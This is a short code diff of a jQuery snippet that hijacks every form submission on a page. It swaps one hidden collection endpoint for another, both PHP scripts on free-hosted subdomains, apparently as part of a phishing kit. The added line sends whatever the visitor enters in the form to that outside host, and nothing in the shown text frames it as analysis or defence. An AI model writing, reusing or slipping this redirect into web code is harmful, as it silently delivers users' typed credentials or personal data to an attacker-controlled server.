@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/iurannn.php");
+  $(myform).attr("action", "https://kawasaki-empattak-duaribuduaempat.000webhostapp.com/zx/juro.php");
 });
